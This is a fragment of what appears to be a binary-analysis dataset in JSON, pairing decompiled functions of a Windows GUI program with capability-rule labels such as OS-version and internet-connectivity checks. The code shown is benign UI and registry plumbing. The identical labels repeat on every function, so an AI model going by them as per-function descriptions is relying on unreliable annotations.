        "decompiled_code": "\nvoid __cdecl fcn.00442fa0(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.004546e8(),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.004546ac();\n            if (((*(piVar3 + 0x51) & 0x80) != 0) && (*(piVar3 + 0x57) != '\\0')) {\n                (**(*piVar3 + 0x7c))();\n            }\n            cVar1 = fcn.004047dc();\n            if (cVar1 != '\\0') {\n                fcn.00442fa0(arg_8h);\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "00443010": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443010(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (((*(in_EAX + 7) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        (**(*in_EAX + 0x7c))();\n        if ((in_EAX[0xa4] != 0) && (iVar1 = fcn.004365a0(),  -1 < iVar1 + -1)) {\n            do {\n                piVar2 = fcn.004365b0();\n                if (*(piVar2 + 0x3e) != '\\0') {\n                    (**(*piVar2 + 0x40))();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.00442fa0(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 219
    },
    "004430e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004430e8(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.004546e8(),  -1 < iVar2 + -1)) {\n        do {\n            iVar3 = fcn.004546ac();\n            if (((*(iVar3 + 0x57) != '\\0') && (cVar1 = fcn.004430b8(arg_8h),  cVar1 != '\\0')) ||\n               ((cVar1 = fcn.004047dc(),  cVar1 != '\\0' && (cVar1 = fcn.004430e8(arg_8h),  cVar1 != '\\0')))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 237
    },
    "00443164": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443164(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        cVar1 = fcn.004430b8(&stack0xfffffffc);\n        if ((cVar1 == '\\0') &&\n           ((cVar1 = fcn.004430b8(&stack0xfffffffc),  cVar1 == '\\0' &&\n            (cVar1 = fcn.004430e8(&stack0xfffffffc),  cVar1 == '\\0')))) {\n            return;\n        }\n        *(param_2 + 0xc) = 1;\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "004431e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004431e8(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.004546e8(),  -1 < iVar2 + -1)) {\n        do {\n            iVar3 = fcn.004546ac();\n            if (((*(iVar3 + 0x57) != '\\0') && (cVar1 = fcn.004431b8(arg_8h),  cVar1 != '\\0')) ||\n               ((cVar1 = fcn.004047dc(),  cVar1 != '\\0' && (cVar1 = fcn.004431e8(arg_8h),  cVar1 != '\\0')))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 237
    },
    "00443264": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443264(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        cVar1 = fcn.004431b8(&stack0xfffffffc);\n        if ((cVar1 == '\\0') &&\n           ((cVar1 = fcn.004431b8(&stack0xfffffffc),  cVar1 == '\\0' &&\n            (cVar1 = fcn.004431e8(&stack0xfffffffc),  cVar1 == '\\0')))) {\n            return;\n        }\n        *(param_2 + 0xc) = 1;\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "004432b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __cdecl fcn.004432b8(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char var_5h;\n    uint var_4h;\n    \n    var_5h = '\\0';\n    iVar2 = fcn.00420604();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.004205d8();\n            cVar1 = fcn.004047dc();\n            if (cVar1 == '\\0') {\n                var_5h = fcn.004432b8(arg_8h);\n                if (var_5h != '\\0') {\n                    return var_5h;\n                }\n            }\n            else {\n                cVar1 = fcn.0044a378();\n                if (cVar1 != '\\0') {\n                    return '\\x01';\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return var_5h;\n}\n",
        "token_count": 221
    },
    "00443334": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.00443334(void)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30a) != 0) {\n        (**(in_EAX + 0x308))();\n    }\n    if ((((*(in_EAX + 0x290) == 0) || (*(*(in_EAX + 0x290) + 0x38) == 0)) || (cVar1 = fcn.0040484c(),  cVar1 == '\\0'))\n       && (cVar1 = fcn.004432b8(&stack0xfffffffc),  cVar1 == '\\0')) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 192
    },
    "004433ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004433ac(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((*(arg_8h + 0x298) != 0) && (iVar1 = (****(arg_8h + 0x298))(*(arg_8h + 0x298), arg_ch, arg_10h),  iVar1 == 0)) {\n        return 0;\n    }\n    uVar2 = fcn.00420770(arg_8h, arg_ch, arg_10h);\n    return uVar2;\n}\n",
        "token_count": 144
    },
    "00443430": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443430(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*0x492504 != NULL)) {\n        cVar1 = fcn.00458904();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.004585f8(0xffffffec);\n            uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n            if ((*(in_EAX + 0x328) == '\\0') && (*(in_EAX + 0x350) == '\\0')) {\n                uVar2 = fcn.004585f8(0xffffffec, uVar3 & 0xfff7ffff);\n                sub.user32.dll_SetWindowLongA(uVar2);\n                uVar2 = fcn.004585f8(0, 0, 0x485);\n                sub.user32.dll_RedrawWindow(uVar2);\n            }\n            else {\n                if ((uVar3 & 0x80000) == 0) {\n                    uVar2 = fcn.004585f8(0xffffffec, uVar3 | 0x80000);\n                    sub.user32.dll_SetWindowLongA(uVar2);\n                }\n                uVar2 = fcn.004585f8(*(in_EAX + 0x354), *(in_EAX + 0x329), \n                                     *(*(in_EAX + 0x328) * 4 + 0x492598) | *(*(in_EAX + 0x350) * 4 + 0x4925a0));\n                (**0x492504)(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 404
    },
    "00443544": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443544(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 != *(in_EAX + 0x350)) {\n        *(in_EAX + 0x350) = param_2;\n        if (*(in_EAX + 0x350) != '\\0') {\n            iVar1 = fcn.00447e3c();\n            if (*(iVar1 + 8) != '\\0') {\n                fcn.00447e3c();\n                fcn.00448160();\n            }\n        }\n        fcn.00443430();\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "00443584": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443584(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((((*(in_EAX + 0x1c) & 0x10) == 0) && (*0x492504 != 0)) &&\n       ((*(in_EAX + 0x328) != '\\0' || (*(in_EAX + 0x350) != '\\0')))) {\n        *(param_2 + 8) = *(param_2 + 8) | 0x80000;\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "0044362c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0044362c(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    (**(*in_EAX + 0xf0))();\n    fcn.0043cc40();\n    fcn.0043f2b8();\n    fcn.00457120();\n    fcn.0043f6d8();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = 0;\n    }\n    return in_EAX;\n}\n",
        "token_count": 194
    },
    "00443b58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00443b58(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint uVar4;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ffc4();\n    puVar2 = *0x4948c0;\n    (*0x4948c0)[1] = in_EAX;\n    *puVar2 = 0x443efc;\n    puVar2 = *0x4948cc;\n    (*0x4948cc)[1] = in_EAX;\n    *puVar2 = 0x443f08;\n    fcn.00443f14();\n    uVar3 = sub.user32.dll_GetKeyboardLayout(0);\n    *(in_EAX + 0x3c) = uVar3;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 0x4c) = uVar3;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 0x50) = uVar3;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 0x54) = uVar3;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 0x58) = uVar3;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 0x7c) = uVar3;\n    uVar3 = sub.user32.dll_GetDC(0);\n    uVar4 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0x5a);\n    *(in_EAX + 0x40) = uVar4;\n    sub.user32.dll_ReleaseDC(0, uVar3);\n    uVar4 = 0;\n    (***0x494a7c)(0, 0, fcn.0043f5c4, *(in_EAX + 0x58));\n    uVar3 = fcn.00424528();\n    *(in_EAX + 0x84) = uVar3;\n    uVar3 = fcn.00424528();\n    *(in_EAX + 0x88) = uVar3;\n    uVar3 = fcn.00424528();\n    *(in_EAX + 0x80) = uVar3;\n    fcn.00444344();\n    iVar1 = *(in_EAX + 0x84);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x444214;\n    iVar1 = *(in_EAX + 0x88);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x444214;\n    iVar1 = *(in_EAX + 0x80);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x444214;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar4;\n    }\n    return in_EAX;\n}\n",
        "token_count": 772
    },
    "00443e28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443e28(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x68) != *(in_EAX + 0x74)) && (*(in_EAX + 0x74) = *(in_EAX + 0x68),  *(in_EAX + 0x9a) != 0)) {\n        (**(in_EAX + 0x98))();\n    }\n    if ((*(in_EAX + 100) != *(in_EAX + 0x70)) && (*(in_EAX + 0x70) = *(in_EAX + 100),  *(in_EAX + 0x92) != 0)) {\n        (**(in_EAX + 0x90))();\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00443eac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443eac(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.004199dc();\n    fcn.004199dc();\n    fcn.004471c4();\n    if ((*(*(in_EAX + 0x50) + 8) == 0) && (*(*0x499c1c + 0x84) != 0)) {\n        fcn.00459d24();\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "00443ff8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443ff8(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack672;\n    uint uStack668;\n    uchar *puStack664;\n    uint uStack656;\n    uint uStack636;\n    uint uStack628;\n    uint uStack624;\n    uchar *puStack620;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_214h;\n    uint lpList;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint hKey;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack620 = &stack0xfffffffc;\n    uStack624 = 0x4441a3;\n    uStack628 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd8c;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x34) == 0) {\n        var_4h = in_EAX;\n        uVar3 = fcn.00404620();\n        *(var_4h + 0x34) = uVar3;\n        fcn.00405530();\n        uStack636 = 0x40;\n        iVar4 = sub.user32.dll_GetKeyboardLayoutList();\n        if (-1 < iVar4 + -1) {\n            var_14h = &fcn.00443ff8::lpList;\n            var_10h = iVar4;\n            do {\n                cVar2 = fcn.0045da44();\n                if (cVar2 != '\\0') {\n                    uStack656 = 0x4440b0;\n                    uStack656 = fcn.0040af18(0);\n                    uStack636 = 0x80000002;\n                    puStack664 = 0x4440bb;\n                    iVar4 = sub.advapi32.dll_RegOpenKeyExA_1();\n                    if (iVar4 == 0) {\n                        uStack668 = 0x44415f;\n                        uStack672 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xfffffd60;\n                        var_8h = 0x100;\n                        uVar3 = hKey;\n                        puStack664 = &stack0xfffffffc;\n                        iVar4 = sub.advapi32.dll_RegQueryValueExA_1\n                                          (hKey, 0x4441ec, 0, 0, &fcn.00443ff8::var_214h, &fcn.00443ff8::var_8h);\n                        if (iVar4 == 0) {\n                            fcn.004057a0();\n                            (**(**(var_4h + 0x34) + 0x3c))();\n                            if (*var_14h == *(var_4h + 0x3c)) {\n                                fcn.004057a0();\n                            }\n                        }\n                        *in_FS_OFFSET = uVar3;\n                        sub.advapi32.dll_RegCloseKey_1(hKey, 0x444166);\n                        return;\n                    }\n                }\n                var_14h = var_14h + 1;\n                var_10h = var_10h + -1;\n            } while (var_10h != 0);\n        }\n        *(*(var_4h + 0x34) + 0x25) = 0;\n        fcn.0041b5f0();\n        puVar1 = puStack620;\n    }\n    puStack620 = puVar1;\n    *in_FS_OFFSET = uStack636;\n    uStack628 = 0x4441aa;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 842
    },
    "00444344": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00444344(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack464;\n    int32_t iStack424;\n    uint uStack420;\n    uchar *puStack416;\n    uint var_191h;\n    uint var_f1h;\n    uint var_b5h;\n    uint pvParam;\n    uint var_1h;\n    \n    puStack416 = &var_1h + 1;\n    var_1h._0_1_ = 0;\n    if (*0x499c1c != 0) {\n        var_1h._0_1_ = *(*0x499c1c + 0x88);\n    }\n    uStack420 = 0x44448b;\n    iStack424 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack424;\n    puVar1 = &var_1h + 1;\n    if (*0x499c1c != 0) {\n        fcn.00446d9c();\n        puVar1 = puStack416;\n    }\n    puStack416 = puVar1;\n    iVar2 = sub.user32.dll_SystemParametersInfoA(0x1f, 0x3c, &pvParam, 0);\n    if (iVar2 == 0) {\n        sub.gdi32.dll_GetStockObject(0xd);\n        fcn.00424978();\n    }\n    else {\n        sub.gdi32.dll_CreateFontIndirectA(&pvParam);\n        fcn.00424978();\n    }\n    var_191h = 0x154;\n    iVar2 = sub.user32.dll_SystemParametersInfoA(0x29, 0, &var_191h, 0);\n    if (iVar2 == 0) {\n        fcn.00424a5c();\n        puStack464 = 0xd;\n        sub.gdi32.dll_GetStockObject();\n        fcn.00424978();\n    }\n    else {\n        puStack464 = &var_b5h;\n        sub.gdi32.dll_CreateFontIndirectA();\n        fcn.00424978();\n        sub.gdi32.dll_CreateFontIndirectA(&var_f1h);\n        fcn.00424978();\n    }\n    fcn.004246fc();\n    fcn.004246fc();\n    *in_FS_OFFSET = puStack464;\n    if (*0x499c1c != 0) {\n        fcn.00446d9c(0x444492);\n    }\n    return;\n}\n",
        "token_count": 584
    },
    "004444a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004444a0(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x8c) = *(in_EAX + 0x8c) + -1;\n    if ((*(in_EAX + 0x8c) == 0) && ((*(in_EAX + 0x8e) & 0x10) != 0)) {\n        fcn.004444c0();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00444550": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00444550(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    char in_DL;\n    int32_t iVar3;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar3 = *(*(arg_8h + -4) + 8) - **(arg_8h + -4);\n    if ((iVar3 < 0) || (in_DL - 3U < 2)) {\n        iVar3 = in_EAX[0x12];\n    }\n    var_10h = *(*(arg_8h + -4) + 0xc) - *(*(arg_8h + -4) + 4);\n    if ((var_10h < 0) || (in_DL - 1U < 2)) {\n        var_10h = in_EAX[0x13];\n    }\n    if ((in_DL == '\\x01') && (*(in_EAX + 0x273) == '\\x02')) {\n        var_8h = fcn.0043df9c();\n        var_ch = fcn.0043dfbc();\n        iVar3 = (***0x494970)(0x3d);\n    }\n    else {\n        var_8h = **(arg_8h + -4);\n        var_ch = *(*(arg_8h + -4) + 4);\n    }\n    if (in_DL == '\\x01') {\n        piVar1 = *(arg_8h + -4) + 4;\n        *piVar1 = *piVar1 + var_10h;\n    }\n    else if (in_DL == '\\x02') {\n        piVar1 = *(arg_8h + -4) + 0xc;\n        *piVar1 = *piVar1 - var_10h;\n        var_ch = *(*(arg_8h + -4) + 0xc);\n    }\n    else if (in_DL == '\\x03') {\n        **(arg_8h + -4) = **(arg_8h + -4) + iVar3;\n    }\n    else if (in_DL == '\\x04') {\n        piVar1 = *(arg_8h + -4) + 8;\n        *piVar1 = *piVar1 - iVar3;\n        var_8h = *(*(arg_8h + -4) + 8);\n    }\n    (**(*in_EAX + 0x88))(var_10h, iVar3);\n    if (*(in_EAX + 0x273) == '\\x02') {\n        iVar3 = iVar3 - var_8h;\n        var_10h = var_10h - var_ch;\n    }\n    iVar2 = in_EAX[0x12];\n    if ((iVar3 != iVar2) || (in_EAX[0x13] != var_10h)) {\n    // switch table (6 cases) at 0x444696\n        switch(in_DL) {\n        case '\\x01':\n            piVar1 = *(arg_8h + -4) + 4;\n            *piVar1 = *piVar1 - (var_10h - in_EAX[0x13]);\n            break;\n        case '\\x02':\n            piVar1 = *(arg_8h + -4) + 0xc;\n            *piVar1 = *piVar1 + (var_10h - in_EAX[0x13]);\n            break;\n        case '\\x03':\n            **(arg_8h + -4) = **(arg_8h + -4) - (iVar3 - iVar2);\n            break;\n        case '\\x04':\n            piVar1 = *(arg_8h + -4) + 8;\n            *piVar1 = *piVar1 + (iVar3 - iVar2);\n            break;\n        case '\\x05':\n            piVar1 = *(arg_8h + -4) + 8;\n            *piVar1 = *piVar1 + (iVar3 - iVar2);\n            piVar1 = *(arg_8h + -4) + 0xc;\n            *piVar1 = *piVar1 + (var_10h - in_EAX[0x13]);\n        }\n    }\n    return;\n}\n",
        "token_count": 986
    },
    "0044470c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0044470c(int32_t arg_8h)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_1h;\n    \n    (**(**(arg_8h + -8) + 8))();\n    if ((((*(arg_8h + -0xc) != 0) && (*(*(arg_8h + -0xc) + 0x30) == 0)) && ((*(*(arg_8h + -0xc) + 0x1c) & 0x10) == 0))\n       && (((*(*(arg_8h + -0xc) + 0x57) != '\\0' && (*(*(arg_8h + -0xc) + 0x5b) == in_AL)) &&\n           (*(*(arg_8h + -0xc) + 0x273) != '\\x01')))) {\n        fcn.00419740();\n    }\n    iVar2 = fcn.00443e20();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00443e0c();\n            if (((*(iVar3 + 0x30) == 0) && (*(iVar3 + 0x5b) == in_AL)) &&\n               (((*(iVar3 + 0x1c) & 0x10) == 0 &&\n                (((*(iVar3 + 0x57) != '\\0' && (*(iVar3 + 0x273) != '\\x01')) && (iVar3 != *(arg_8h + -0xc))))))) {\n                for (iVar3 = 0; iVar3 < *(*(arg_8h + -8) + 8); iVar3 = iVar3 + 1) {\n                    fcn.00419898();\n                    cVar1 = fcn.004444c8();\n                    if (cVar1 != '\\0') break;\n                }\n                fcn.00419914();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = *(*(arg_8h + -8) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = arg_8h;\n            fcn.00419898();\n            fcn.00444550(iVar3);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 575
    },
    "0044485c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044485c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00443e20();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00443e0c();\n            if ((((*(iVar2 + 0x30) == 0) && ((*(iVar2 + 0x1c) & 0x10) == 0)) && (*(iVar2 + 0x5b) != '\\0')) &&\n               ((*(iVar2 + 0x57) != '\\0' && (*(iVar2 + 0x273) != '\\x01')))) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 201
    },
    "0044493c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044493c(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x8c) != 0) {\n        *(in_EAX + 0x8e) = *(in_EAX + 0x8e) | 0x10;\n        return;\n    }\n    puStack32 = 0x44496a;\n    var_4h = in_EAX;\n    fcn.00444498();\n    uStack36 = 0x4449b5;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uVar1 = 0x30;\n    puStack32 = &stack0xfffffffc;\n    sub.user32.dll_SystemParametersInfoA(0x30, 0, &fcn.0044493c::var_14h, 0);\n    fcn.004448b4();\n    *in_FS_OFFSET = uVar1;\n    *(var_4h + 0x8e) = *(var_4h + 0x8e) & 0xffef;\n    fcn.004444a0(0x4449bc);\n    return;\n}\n",
        "token_count": 312
